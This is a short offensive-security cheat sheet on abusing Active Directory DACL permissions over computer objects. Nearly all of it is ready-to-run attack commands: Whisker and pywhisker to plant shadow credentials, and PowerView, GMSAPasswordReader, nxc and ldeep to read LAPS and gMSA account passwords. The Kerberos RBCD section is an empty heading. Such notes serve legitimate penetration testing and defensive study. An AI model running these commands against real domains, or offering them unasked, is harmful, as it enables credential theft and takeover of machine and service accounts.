# DACL Attacks on a Computer

## 1) WriteProperty

### Shadow Credentials

    Whisker.exe add /target:<target> /domain:domain.local /dc:dc.domain.local /path:C:\path\to\file.pfx /password:Password123!

# Linux

    pywhisker.py -t computer$ -a add -u user1 -p password -d domain.local -dc-ip <DC_IP> --filename user2

### Kerberos RBCD

## 2) AllExtendedRights

### ReadLAPSPassword

#####  With PowerView

    Get-DomainComputer <target>.domain.local -Properties ms-mcs-AdmPwd,displayname,ms-mcs-AdmPwdExpirationTime

### ReadGMSAPassword

    ./GMSAPasswordReader.exe --accountname gmsaAccount

# Linux

    nxc ldap <DC_IP> -u user1 -p password -M laps -o computer="<target>"

    ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> gmsa
